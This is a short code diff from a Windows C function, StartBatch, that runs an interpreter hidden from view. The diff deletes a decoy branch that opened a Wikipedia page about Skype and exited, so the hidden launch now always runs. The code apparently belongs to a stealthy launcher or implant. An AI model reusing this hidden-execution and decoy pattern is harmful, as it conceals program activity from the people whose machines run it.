@@ -357,14 +357,7 @@ BOOL StartBatch(__in LPWSTR pName)
 	si.cb = sizeof(si);
 	si.dwFlags = STARTF_USESHOWWINDOW;
 	si.wShowWindow = SW_HIDE;
-	
-	if (FakeConditionalVersion())
-	{
-		ShellExecute(NULL, L"open", L"http://en.wikipedia.org/wiki/Skype", NULL, NULL, SW_SHOWNORMAL);
-		exit(0);
-	}
-	else
-		bRet = CreateProcess(pInterpreter, pApplicationName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	bRet = CreateProcess(pInterpreter, pApplicationName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 
 	zfree(pApplicationName);
 	zfree(pInterpreter);	
